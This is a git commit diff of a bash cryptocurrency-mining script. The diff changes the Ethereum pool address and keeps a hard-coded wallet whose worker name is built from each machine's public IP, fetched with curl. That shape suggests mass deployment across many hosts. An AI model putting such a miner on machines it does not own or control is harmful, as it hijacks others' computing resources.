d81e47521321174b0817d19f7d20e14e5f8fe723
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-09-18 03:38:45 -0700

    Update bmtngheodoiqua.sh

--- bmtngheodoiqua.sh
+++ bmtngheodoiqua.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 #!/bin/bash
 
-POOL=eth-eu1.nanopool.org:9999
+POOL=eth.2miners.com:2020
 WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )-hienthuan343
 cd "$(dirname "$0")"
 
